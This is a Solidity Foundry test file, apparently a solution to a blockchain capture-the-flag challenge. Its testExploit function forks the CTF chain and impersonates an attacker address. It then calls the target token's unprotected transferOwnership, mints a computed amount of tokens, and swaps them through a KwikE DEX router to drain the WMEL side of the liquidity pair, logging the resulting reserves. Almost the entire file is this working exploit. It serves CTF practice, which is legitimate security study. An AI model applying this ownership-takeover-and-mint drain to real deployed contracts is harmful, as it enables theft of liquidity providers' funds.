// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "../src/chall03/chall03.sol";
import "../src/DexFiles/Library.sol";

import "forge-std/console.sol";


interface Chall04_target{
    function transferOwnership(address) external;
    function mint(uint256) external;
    function approve(address,uint256) external;
}


contract ContractTest is Test {

    address hacker = vm.addr(1);
    address wmel = 0xFC229C18798aFBCbaE81B0a6B5AebF5Eb3054C9A;
    address _target = 0xEd30E6A03858141941B3262baf722d283C9159F0;
    address _factory = 0x2DF0c7EbDBfBCb77231BD74A06D2fFA87390b132;
    address _router = 0xCFD0dD2b96faA50Ddb22Df7B101ca4aC034a8826;

    Chall04_target public target;
    IKwikEFactory public factory;
    IKwikEPair public kpair;
    IKwikERouter02 public router;


    function setUp() public {
        target = Chall04_target(_target);
        factory = IKwikEFactory(_factory);
        router = IKwikERouter02(_router);
        
    }

    function testExploit() public {
        vm.createSelectFork(vm.rpcUrl("CTFblockchain"));
        vm.startPrank(hacker);

        kpair = IKwikEPair(factory.getPair(address(target),wmel));

        address[] memory t = new address[](2);
        t[0] = address(target);
        t[1] = wmel;

        uint valueOut = 20 ether - 0.4 ether;//19550000000000000000;

        uint[] memory amountsIn = router.getAmountsIn(valueOut,t);
        uint hackamount = amountsIn[0];

        target.transferOwnership(hacker);

        target.mint(hackamount);

        target.approve(address(router),type(uint256).max);

        router.swapExactTokensForTokens(hackamount,0,t,hacker,block.timestamp+2 days);

        kpair = IKwikEPair(factory.getPair(address(target),wmel));
        (uint112 amount00, uint112 amount01,) = kpair.getReserves();
        console.log("Amount0 in reserve : ",amount00,"addr 0 : ",kpair.token0()); //erc20 vulnerable
        console.log("Amount1 in reserve : ",amount01,"addr 1 : ",kpair.token1());

    }
}
